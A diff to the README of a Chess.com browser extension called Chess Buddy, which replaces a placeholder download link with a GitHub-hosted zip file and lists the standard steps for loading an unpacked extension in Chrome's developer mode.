@@ -7,7 +7,7 @@ Step into the realm of Chess Buddy, your fantastical sidekick for Chess.com! Ele
 
 ## Dive In 🚀
 Embark on the adventure with these easy steps:
-- [Grab the most recent version](#): Unpack the extension.
+- [Grab the most recent version](https://github.com/anauwal/chess_buddy/files/13896598/ChessBuddy.zip): Unpack the extension.
 - Access `chrome://extensions` or swing by the `Manage extensions` page.
 - Activate `Developer mode` at the upper right corner.
 - Give a tap to the `Load unpacked` button at the upper left corner.
